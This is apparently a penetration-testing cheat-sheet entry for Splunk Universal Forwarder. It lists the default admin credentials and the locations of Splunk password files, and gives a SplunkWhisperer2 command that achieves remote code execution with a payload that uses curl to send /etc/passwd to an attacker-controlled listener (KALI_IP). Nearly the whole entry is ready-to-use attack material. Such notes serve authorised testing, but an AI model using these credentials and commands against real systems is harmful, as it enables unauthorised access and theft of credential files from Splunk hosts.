# splunk universal forwarder

## Default Creds

```
admin:changeme
```

## Interesting Paths

```bash
# common password locations
C:\Program Files\Splunk\etc\passwd

/opt/Splunk/etc/passwd
```

## SplunkWhisperer2 Local PE + RCE

```
https://github.com/cnotin/SplunkWhisperer2
# start nc on KALI_PORT
python PySplunkWhisperer2_remote.py --scheme https --username USER --password PASS --host IP --lhost KALI_IP --payload "curl -F 'data=@/etc/passwd' http://KALI_IP:KALI_PORT}}"
```
